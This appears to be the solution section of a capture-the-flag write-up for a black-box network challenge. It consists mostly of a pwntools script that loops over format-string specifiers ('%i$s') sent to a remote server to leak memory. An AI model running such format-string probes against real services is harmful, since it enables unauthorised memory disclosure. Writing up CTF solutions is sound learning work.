## Solution
We are only given a connection information. we can connect to this via netcat. as this is a black box challenge where the clues are given in the challenge name and description, nothing else need to be said. The following exploit should work just fine:
```python
#!/usr/bin/env python

from pwn import *


for i in range(1,200):
    p = remote("139.59.0.163",7777)
    x = f'%{i}$s'
    p.recvline()
    p.sendline(bytes(x,"UTF-8"))
    print(p.recvline())

```
